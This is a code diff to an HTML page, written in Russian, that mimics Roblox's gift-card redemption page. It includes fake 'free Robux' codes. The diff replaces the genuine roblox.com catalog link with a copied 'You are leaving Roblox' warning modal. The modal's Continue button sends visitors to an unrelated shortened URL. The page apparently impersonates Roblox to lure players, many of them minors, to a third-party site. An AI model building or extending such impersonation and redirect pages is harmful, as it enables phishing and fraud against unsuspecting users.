@@ -433,7 +433,7 @@
             color: white !important;
         }
         
-        /* Стили для всплывающего оповещения */
+        /* Стили для всплывающего оповещения об успешной активации */
         .alert-overlay {
             display: none;
             position: fixed;
@@ -483,6 +483,70 @@
         .back-btn {
             background: #00a2ff;
             color: white;
+        }
+        
+        /* Стили для модального окна "Вы покидаете Roblox" */
+        .leave-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1002;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .leave-box {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+        }
+        
+        .leave-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #333;
+        }
+        
+        .leave-text {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        
+        .leave-buttons {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .leave-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .continue-btn {
+            background: #00a2ff;
+            color: white;
+        }
+        
+        .cancel-btn {
+            background: #f0f0f0;
+            color: #333;
         }
         
         /* Стили для фотографии подарочной карты */
@@ -790,7 +854,7 @@
                         </a>
                     </li>
                     <li class="side-menu-item">
-                        <a href="https://www.roblox.com/catalog" class="side-menu-link">
+                        <a href="#" class="side-menu-link" id="official-store-link">
                             <div class="side-menu-icon">
                                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                     <path d="M6 2L3 6V20C3 20.5304 3.21071 21.0391 3.58579 21.4142C3.96086 21.7893 4.46957 22 5 22H19C19.5304 22 20.0391 21.7893 20.4142 21.4142C20.7893 21.0391 21 20.5304 21 20V6L18 2H6Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
@@ -914,6 +978,22 @@
         </div>
     </div>
 
+    <!-- Модальное окно "Вы покидаете Roblox" -->
+    <div class="leave-overlay" id="leave-overlay">
+        <div class="leave-box">
+            <div class="leave-title">Вы покидаете Roblox</div>
+            <div class="leave-text">
+                Внимание, Robloxian: нажав «Продолжить», вы будете перенаправлены на сайт розничной торговли, который не принадлежит Roblox и не управляется им. У них могут быть другие условия и политика конфиденциальности.
+                <br><br>
+                Обратите внимание: для покупки товаров онлайн вам должно быть больше 18 лет. Надеемся увидеть вас снова!
+            </div>
+            <div class="leave-buttons">
+                <button class="leave-btn cancel-btn" id="leave-cancel-btn">Отмена</button>
+                <button class="leave-btn continue-btn" id="leave-continue-btn">Продолжить</button>
+            </div>
+        </div>
+    </div>
+
     <script>
         const termsCheckbox = document.getElementById('terms-checkbox');
         const redeemBtn = document.getElementById('redeem-btn');
@@ -928,6 +1008,10 @@
         const mobileSearchBtn = document.getElementById('mobile-search-btn');
         const mobileSearchContainer = document.getElementById('mobile-search-container');
         const mobileSearchBox = document.getElementById('mobile-search-box');
+        const officialStoreLink = document.getElementById('official-store-link');
+        const leaveOverlay = document.getElementById('leave-overlay');
+        const leaveCancelBtn = document.getElementById('leave-cancel-btn');
+        const leaveContinueBtn = document.getElementById('leave-continue-btn');
         
         // Список действительных кодов
         const validCodes = ["SPIDERCOLA", "TWEETROBLOX", "ROBLOXEDU", "FREEROBUX", "DDJ", "FREENGNISDI"];
@@ -1029,6 +1113,34 @@
                 if (query) {
                     window.open(`https://www.roblox.com/search/users?keyword=${encodeURIComponent(query)}`, '_blank');
                 }
+            }
+        });
+
+        // Обработчик для кнопки "Официальный магазин"
+        officialStoreLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Закрываем боковое меню
+            sideMenu.classList.remove('active');
+            sideMenuOverlay.classList.remove('active');
+            // Показываем модальное окно
+            leaveOverlay.style.display = 'flex';
+        });
+
+        // Обработчик для кнопки "Отмена" в модальном окне
+        leaveCancelBtn.addEventListener('click', function() {
+            leaveOverlay.style.display = 'none';
+        });
+
+        // Обработчик для кнопки "Продолжить" в модальном окне
+        leaveContinueBtn.addEventListener('click', function() {
+            // Переходим по ссылке (можно заменить на нужный URL)
+            window.location.href = 'https://wdho.ru/7Wvm';
+        });
+
+        // Закрытие модального окна при клике вне его
+        leaveOverlay.addEventListener('click', function(e) {
+            if (e.target === leaveOverlay) {
+                leaveOverlay.style.display = 'none';
             }
         });
     </script>
